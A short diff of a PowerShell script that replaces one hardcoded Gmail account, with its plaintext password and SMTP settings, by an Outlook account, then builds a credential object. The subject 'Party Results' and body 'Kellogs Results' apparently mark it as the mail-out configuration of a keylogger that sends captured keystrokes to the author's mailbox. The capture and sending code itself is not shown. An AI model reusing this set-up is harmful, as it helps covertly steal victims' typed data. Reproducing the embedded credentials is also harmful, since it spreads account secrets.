@@ -1,11 +1,11 @@
 $TimeForFun = 30
-$Dear = "nuclearcheese4atomicrats@gmail.com"
-$Pw = "Ratas123!!"
-$To = "nuclearcheese4atomicrats@gmail.com"
+$Dear = "delfin_imola@outlook.es"
+$Pw = "Del123Fin!"
+$To = "delfin_imola@outlook.es"
 $Subject = "Party Results"
 $body = "Kellogs Results"
-$SMTPServer = "smtp.gmail.com"
-$SMTPPort = "465"
+$SMTPServer = "smtp-mail.outlook.com"
+$SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $Dear, ($Pw | ConvertTo-SecureString -AsPlainText -Force)
 ############################
  
